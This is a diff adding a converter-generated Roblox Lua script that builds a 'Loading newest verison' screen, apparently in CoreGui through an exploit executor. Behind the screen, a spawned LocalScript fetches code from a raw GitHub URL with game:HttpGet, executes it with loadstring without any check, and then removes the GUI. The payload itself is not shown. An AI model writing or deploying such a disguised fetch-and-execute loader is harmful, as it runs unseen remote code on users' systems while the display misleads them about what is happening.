@@ -1,1 +1,70 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
 
+-- Instances: 6 | Scripts: 1 | Modules: 0 | Tags: 0
+local G2L = {};
+
+-- StarterGui.ScreenGui
+G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+-- StarterGui.ScreenGui.Frame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2"]["Size"] = UDim2.new(0, 446, 0, 226);
+G2L["2"]["Position"] = UDim2.new(0.25021, 0, 0.28338, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ImageLabel
+G2L["3"] = Instance.new("ImageLabel", G2L["2"]);
+G2L["3"]["BorderSizePixel"] = 0;
+G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3"]["Image"] = [[http://www.roblox.com/asset/?id=13447168967]];
+G2L["3"]["Size"] = UDim2.new(0, 446, 0, 226);
+G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.ScreenGui.Frame.TextLabel
+G2L["4"] = Instance.new("TextLabel", G2L["2"]);
+G2L["4"]["TextWrapped"] = true;
+G2L["4"]["BorderSizePixel"] = 0;
+G2L["4"]["TextSize"] = 18;
+G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4"]["Size"] = UDim2.new(0, 200, 0, 50);
+G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4"]["Text"] = [[Loading newest verison!!!!]];
+G2L["4"]["Position"] = UDim2.new(0.27578, 0, 0.66372, 0);
+
+
+-- StarterGui.ScreenGui.Frame.LocalScript
+G2L["5"] = Instance.new("LocalScript", G2L["2"]);
+
+
+
+-- StarterGui.ScreenGui.UIAspectRatioConstraint
+G2L["6"] = Instance.new("UIAspectRatioConstraint", G2L["1"]);
+G2L["6"]["AspectRatio"] = 1.64673;
+
+
+-- StarterGui.ScreenGui.Frame.LocalScript
+local function C_5()
+local script = G2L["5"];
+	wait(2)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Oproxide/RetroStudio/refs/heads/main/Sources/BaseForm.vulni"))()
+	script.Parent.Parent:Destroy()
+end;
+task.spawn(C_5);
+
+return G2L["1"], require;
